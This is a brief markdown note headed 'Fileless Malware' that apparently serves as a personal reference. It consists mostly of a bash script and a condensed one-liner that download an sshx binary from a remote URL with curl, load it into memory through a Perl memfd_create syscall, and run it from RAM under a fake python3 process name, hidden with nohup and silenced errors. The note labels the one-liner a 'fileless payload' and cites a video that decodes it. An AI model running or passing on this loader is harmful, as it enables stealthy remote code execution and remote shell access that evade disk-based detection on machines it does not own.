# Fileless Malware

```bash
#!/bin/bash

ARCHITECTURE=$(uname -m)
URL="https://s3.amazonaws.com/sshx/sshx-${ARCHITECTURE}-unknown-linux-musl.tar.gz"
TAR_MEMBER="sshx"

# Extract the tarball file into stdout
function extract_tarball() {
    curl -SsfL "${URL}" |
        tar xfOz - "${TAR_MEMBER}" 2>/dev/null
}

# Create a syscall of memfd_create by checking two numbers (319 or 279) to execute in RAM.
# and ensure it's an unsigned integer
function perl_loader() {
    nohup perl -e '
        for (319, 279) {
            ($file_descriptor = syscall $_, $", 1) > 0 && last;
        }

        open($o, ">&=".$file_descriptor) or die "open failed: $!";

        print $o (<STDIN>);

        exec {"/proc/$$/fd/$file_descriptor"} "/usr/bin/python3", ("-q");
    ' 2>/dev/null
}

# To understand the process
function capture_output() {
    read -r x
    echo "${x}"
} &

function main() {
    echo "$(
        extract_tarball |
        perl_loader |
        capture_output
    )"
}

main "${@}"
```

one liner fileless payload.

```bash
echo $(curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz | tar xfOz - sshx 2>/dev/null \
|nohup perl '-efor(319, 279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"} "/usr/bin/python3", ("-q")' 2>/dev/null \
| {read x; echo "$x";}&)
```

---
## References

### Hack The Clown

- [Hack The Clown: Decoding a Stealthy one-liner Linux command](https://www.youtube.com/watch?v=78zRWUw9Rnw)